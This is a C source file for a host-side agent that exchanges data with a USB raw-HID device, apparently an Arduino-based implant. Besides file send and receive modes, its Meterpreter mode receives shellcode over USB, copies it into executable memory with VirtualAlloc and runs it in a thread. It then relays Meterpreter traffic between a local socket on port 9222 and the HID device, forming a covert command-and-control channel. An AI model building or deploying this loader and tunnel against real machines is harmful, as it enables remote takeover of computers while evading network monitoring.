#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <errno.h>
#include "hidapi-master/hidapi/hidapi.h"

#if defined(OS_LINUX) || defined(OS_MACOSX)
	#include <unistd.h>
	#include <sys/ioctl.h>
	#include <termios.h>
	//#define BLOCKSIZE 256 // Factor/multiple of 64
	//#define LOG(msg,args,...) printf("[LOG] %s(%s:%d) "msg"\n",  __func__,__FILE__, __LINE__, ##args)
	//#define ERROR(msg,args,...) printf("[ERROR] %s(%s:%d) "msg"\n",  __func__,__FILE__, __LINE__, ##args)
#elif defined(OS_WINDOWS)
	#include <windows.h>
	#include <conio.h>
	#include <TlHelp32.h>

	#pragma comment(lib,"ws2_32.lib") //Winsock Library

	#define BLOCKSIZE 64 // Factor/multiple of 64
	#define LOG(msg,...) printf("[LOG] %s(%d) "msg"\n",  __func__, __LINE__, __VA_ARGS__)
	#define ERROR(msg,...) printf("[ERROR] %s(%d) "msg"\n",  __func__, __LINE__, __VA_ARGS__)

	HANDLE ExecuteShellcode(PBYTE pShellcode, SIZE_T szShellcodeLength, BOOL quiet);
	DWORD WINAPI MeterpreterExecPayloadStub(LPVOID lpParameter);
	void usleep(__int64 usec);
#endif


int savefile(char *sFilename, char *sMode);
int hid_write_rep(hid_device *dev, const unsigned char *data, size_t length);
int hid_read_rep(hid_device *dev, const unsigned char *data, size_t length);
char *receiveMeterpreter(long *metSize);
int meterpreterMode();
DWORD WINAPI msf_recv_thread();
DWORD WINAPI msf_send_thread();



#define RAW_EXIT 0xFF
#define RAW_FILENAME 0x10
#define RAW_DATA 0x11
#define RAW_SIZE 0x12
#define RAW_HID 0x03
#define RAW_MET 0x04
#define RAW_METCTL 0x05

// int goUSB;
hid_device *gUSBhandle;
int giMet;
int giHIDRecvTimeout = 200;
int giHIDSendTimeout = 2000;
int iBackoff = 70000;
long glMsfReceive, glMsfReceiveOld;
long glMsfSend, glMsfSendOld;
SOCKET goMetSocket;

struct file_data {
	char type;
	char data[BLOCKSIZE - 1];
};

struct met_data {
	char type;
	char length;
	char data[BLOCKSIZE - 2];
};


int main(int argc, char *argv[])
{
	struct hid_device_info *devs, *cur_dev;
	int num;
	int bReceiving = 1;
	struct file_data filename;

	if (hid_init())
		return -1;

	devs = hid_enumerate(0x0, 0x0);
	cur_dev = devs;
	while (cur_dev) {
		printf("Device Found\n  type: %04hx %04hx\n  path: %s\n  serial_number: %ls", cur_dev->vendor_id, cur_dev->product_id, cur_dev->path, cur_dev->serial_number);
		printf("\n");
		printf("  Manufacturer: %ls\n", cur_dev->manufacturer_string);
		printf("  Product:      %ls\n", cur_dev->product_string);
		printf("  Release:      %hx\n", cur_dev->release_number);
		printf("  Interface:    %d\n", cur_dev->interface_number);
		printf("\n");
		cur_dev = cur_dev->next;
	}
	hid_free_enumeration(devs);

	// C-based example is 16C0:0480:FFAB:0200
	// goUSB = rawhid_open(1, 0x16C0, 0x0480, 0xFFAB, 0x0200);
	gUSBhandle = hid_open_if(0x2341, 0x8041,2, NULL);
	if (gUSBhandle <= 0) {
		ERROR("No rawhid device found");
			return -1;
	}
	LOG("Found rawhid device");

	// Save mode
	if (strcmp(argv[1], "-w") == 0) {
		LOG("Entering save...");
		bReceiving = 1;
		while (bReceiving) {
			// num = rawhid_recv(0, &filename, BLOCKSIZE, 220);
			num = hid_read_rep(gUSBhandle, &filename, BLOCKSIZE);
			if (num < 0) {
				ERROR("Receive: Error reading filename, device went offline");
				// rawhid_close(0);
				hid_close(gUSBhandle);
				return 0;
			}
			if (num > 0 && filename.type == RAW_FILENAME) { // Read file name
				LOG("Receive: recv %d bytes:", num);
				LOG("Type:%c Name:%s", filename.type, filename.data);
				// Save to file
				// TODO: Allow different save modes
				savefile(filename.data, "wb");
				bReceiving = 0;
			}
		}
	}
	// Send mode
	else if (strcmp(argv[1], "-s") == 0) {
		LOG("Entering send...");

		memset(filename.data, 0x00, BLOCKSIZE - 1);
		// Send filename packet
		filename.type = RAW_FILENAME;
		strcpy(filename.data, argv[2]);
	
		if (hid_write_rep(gUSBhandle, &filename, BLOCKSIZE)<0) {
			ERROR("Transmit: Error sending filename or device went offline");
			hid_close(gUSBhandle);
			return 0;
		}
		LOG("Before sendfile");
		sendfile(filename.data);

	}
	// Meterpreter mode
	else if (strcmp(argv[1], "-m") == 0) {
		LOG("Meterpreter mode...");
		meterpreterMode();

	}
	hid_exit();
}

int sendfile(char *sFilename) {
	FILE *sendFile;
	int i;
	unsigned long iFileSize, iFPos;
	struct file_data filedata;

	// Send file size
	filedata.type = RAW_SIZE;
	sendFile = fopen(sFilename, "rb");
	fseek(sendFile, 0L, SEEK_END);
	*(unsigned long *)filedata.data = ftell(sendFile);
	iFileSize = *(unsigned long *)filedata.data;
	LOG("sendFile:after ftell, size:%ul", iFileSize);
	rewind(sendFile);
	if (hid_write_rep(gUSBhandle, &filedata, BLOCKSIZE)<0) {
		ERROR("Failed to send size");
	}
	LOG("sendFile:after sending size");
	// Send data
	iFPos = 0;
	filedata.type = RAW_DATA;
	memset(filedata.data, 0x00, sizeof(char));
	i = BLOCKSIZE - 1;
	iFPos = 0;
	while (i == BLOCKSIZE - 1) {
		i = fread(filedata.data, 1, BLOCKSIZE - 1, sendFile);
		if (hid_write_rep(gUSBhandle, &filedata, BLOCKSIZE)<0) {
			ERROR("Error sending packet at file pos:%ul", iFPos);
			return -1;
		}
		iFPos += BLOCKSIZE - 1;
		memset(filedata.data, 0x00, sizeof(char));
	}
	fclose(sendFile);
	return 1;
}

int savefile(char *sFilename, char *sMode) {
	unsigned long iFileSize, iFPos;
	int bReceiving = 1;
	FILE *outFile;
	int i, num;
	struct file_data filedata;

	outFile = fopen(sFilename, sMode);
	if (outFile == NULL) {
		ERROR("Error writing to file %s, err:%d", sFilename, errno);
		return -1;
	}
	// Open file for write
	while (bReceiving) {
		// check if any Raw HID packet has arrived
		num = hid_read_rep(gUSBhandle, &filedata, BLOCKSIZE);
		if (num < 0) {
			ERROR("Error reading, device went offline, err:%d", errno);
			//rawhid_close(0);
			hid_close(gUSBhandle);
			return 0;
		}
		if (num > 0) {
			// Check if filesize
			if (filedata.type == RAW_SIZE) {
				iFileSize = *(unsigned long *)filedata.data;
				LOG("File size is:%ul", iFileSize);
				iFPos = 0;
			}
			else {
				// Stream out
				for (i = 0; i < num - 1 && iFPos < iFileSize; i++, iFPos++)
					fwrite(&filedata.data[i], 1, 1, outFile);

				if (iFPos >= iFileSize) {
					bReceiving = 0;
				}
				LOG("Transferred: %d of %d", iFPos, iFileSize);
			}


		}
	}
}

char *receiveMeterpreter(long *metSize) {

	int bReceiving = 1;
	int i, num;
	unsigned long iFileSize, iFPos;
	struct file_data filedata;
	char *pMet;
	bReceiving = 1;
	while (bReceiving) {
		num = hid_read_rep(gUSBhandle, &filedata, BLOCKSIZE);
		if (num < 0) {
			ERROR("Receive: Error reading meterpreter data, device went offline");
			//rawhid_close(0);
			hid_close(gUSBhandle);
			return 0;
		}
		if (num > 0 && filedata.type == RAW_SIZE) { // Read meterpreter size, ignores RAW_FILENAME packet, or could use that as info
			LOG("Receive: recv %d bytes:", num);
			iFileSize = *(unsigned long *)filedata.data;
			LOG("File size is:%ul", iFileSize);
			bReceiving = 0;
		}
	}

	// Open buffer for storage
	//
	pMet = malloc(iFileSize);
	if (pMet == NULL) {
		ERROR("Failed to allocate space for meterpreter image");
	}

	bReceiving = 1;
	iFPos = 0;
	while (bReceiving) {
		// check if any Raw HID packet has arrived
		num = hid_read_rep(gUSBhandle, &filedata, BLOCKSIZE);
		if (num < 0) {
			ERROR("Error reading, device went offline, err:%d", errno);
			hid_close(gUSBhandle);
			return 0;
		}
		if (num > 0) {
			// Check if right data
			if (filedata.type == RAW_DATA) { //just use the normal packet?
				// Stream out
				for (i = 0; i < num - 1 && iFPos < iFileSize; i++, iFPos++)
					pMet[iFPos] = filedata.data[i];
				if (iFPos >= iFileSize) {
					bReceiving = 0;
				}
				LOG("Transferred: %d of %d", iFPos, iFileSize);
			}
		}
	}

	*metSize = (long)iFileSize;
	return pMet;
}

int meterpreterMode() {
#if defined(OS_WINDOWS)
	WSADATA wsa;
	HANDLE tMsfRecvThread, tMsfSendThread;
#endif
	char *pMet;
	struct sockaddr_in smetserver;
	long metSize;

#if defined(OS_WINDOWS)
	LOG("Initialising Winsock...");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		ERROR("Failed. Error Code (%d):%s", WSAGetLastError(), strerror(WSAGetLastError()));
		return -1;
	}

	// Create socket
	goMetSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (goMetSocket == -1)
	{
		ERROR("Error opening socket");
		return -1;
	}
	smetserver.sin_port = htons(9222);
	smetserver.sin_addr.s_addr = inet_addr("127.0.0.1");
	smetserver.sin_family = AF_INET;

	pMet = receiveMeterpreter(&metSize); // Need to also get size, ptr to size.
	ExecuteShellcode(pMet, metSize, 0);

	//Connect to meterpreter
	if (connect(goMetSocket, (struct sockaddr *)&smetserver, sizeof(smetserver)) < 0)
	{
		ERROR("Error connecting to Meterpreter (%d):%s",errno, strerror(errno));
		return -1;
	}

	// Launch threads, set semaphore
	giMet = 1;
	tMsfRecvThread = CreateThread(NULL, 0, msf_recv_thread, NULL, 0, NULL);
	tMsfSendThread = CreateThread(NULL, 0, msf_send_thread, NULL, 0, NULL);

	while (giMet) {
		if (glMsfReceive != glMsfReceiveOld || glMsfSend != glMsfSendOld)
			LOG("Transfer: In:%d Out:%d", glMsfReceive, glMsfSend);
		glMsfReceiveOld = glMsfReceive;
		glMsfSendOld = glMsfSend;
		usleep(1000000);

	}

	// Free pmet
	free(pMet);

#elif defined(OS_LINUX)
	LOG("Meterpreter mode for Linux not supported yet");
#endif
	//
}

DWORD WINAPI msf_recv_thread() {
	int iRecv = 0, iSend = 0;
	struct met_data sMetData;
	while (giMet) {

		iRecv = hid_read_rep(gUSBhandle, &sMetData, BLOCKSIZE);
		if (iRecv == -1) {
			ERROR("HID receive failure (%d):%s", errno, strerror(errno));
			giMet = 0;
			return -1;
		}
		else if (iRecv > 0) {
			switch (sMetData.type) {
			case RAW_EXIT:
				giMet = 0;
				return 0;
			case RAW_METCTL:
				glMsfReceive += sMetData.length;
				iSend = send(goMetSocket, sMetData.data, sMetData.length, 0);
				if ( iSend < 0) {
					ERROR("Meterpreter send failure (%d):%s", errno, strerror(errno));
					giMet = 0;
					return -1;
				}
				else if (iSend == 0) {
					giMet = 0;
					return 0;
				}
			}
		}

	}
	return 0;
}

DWORD WINAPI msf_send_thread() {
	int iRecv = 0, iSend = 0;
	struct met_data sMetData;
	sMetData.type = RAW_METCTL;
	while (giMet) {
		iRecv = recv(goMetSocket, sMetData.data, BLOCKSIZE - 2, 0);
		if (iRecv < 0) {
			ERROR("Meterpreter receive failure (%d):%s", errno, strerror(errno));
			giMet = 0;
			return -1;
		}
		else if (iRecv == 0) {
			giMet = 0;
			return 0;
		}
		else {
			sMetData.length = (char)iRecv;
			iSend = 0;

			iSend = hid_write_rep(gUSBhandle, &sMetData, BLOCKSIZE);
			if (iSend == -1) {
				ERROR("HID Send Failure (%d):%s ", errno, strerror(errno));
				giMet = 0;
				return -1;
			}
			glMsfSend += sMetData.length;
		}
	}
}


#if defined(OS_WINDOWS)

HANDLE ExecuteShellcode(PBYTE pShellcode, SIZE_T szShellcodeLength, BOOL quiet) {
	HANDLE hLocalThread;
	DWORD dwThreadId;
	PVOID pBuffer;

	pBuffer = VirtualAlloc(NULL, szShellcodeLength, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	memcpy(pBuffer, pShellcode, szShellcodeLength);
	hLocalThread = CreateThread(NULL, 0, MeterpreterExecPayloadStub, pBuffer, 0, &dwThreadId);

	LOG("Shellcode executed... ");
	// WaitForSingleObject(hLocalThread, INFINITE);

	// VirtualFree(pBuffer, 0, MEM_RELEASE); must release at some point...
	return hLocalThread;
}

DWORD WINAPI MeterpreterExecPayloadStub(LPVOID lpParameter) {
	__try {
		VOID(*lpCode)() = (VOID(*)())lpParameter;
		lpCode();
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
	}
	return 0;
}

#endif


int hid_write_rep(hid_device *dev, const unsigned char *data, size_t length) {
	int result=-1, iRetry = 5;
	unsigned char buf[BLOCKSIZE + 1];
	memcpy(&buf[1], data, length);
	buf[0] = 0;
	while (result == -1 && iRetry!=-1) {
		result = hid_write(dev, buf, length+1);
		if (result == -1) {
			LOG("Sleep retry %d, %d", 6-iRetry, iBackoff*(6 - iRetry));
			usleep(iBackoff*(6-iRetry));
			iRetry--;
		}
	}
	// usleep(iBackoff);
	return result-1;
}

int hid_read_rep(hid_device *dev, const unsigned char *data, size_t length) {
	int result = -1;
	unsigned char buf[BLOCKSIZE + 1];
	result = hid_read(dev, buf, length + 1);
	if (result>0)
	{
		memcpy(data, &buf[1], length);
		return result - 1;
	}
	return result;
}

#if defined(OS_WINDOWS)
void usleep(__int64 usec)
{
	HANDLE timer;
	LARGE_INTEGER ft;

	ft.QuadPart = -(10 * usec); // Convert to 100 nanosecond interval, negative value indicates relative time

	timer = CreateWaitableTimer(NULL, TRUE, NULL);
	SetWaitableTimer(timer, &ft, 1, NULL, NULL, 0);
	WaitForSingleObject(timer, INFINITE);
	CloseHandle(timer);
}
#endif
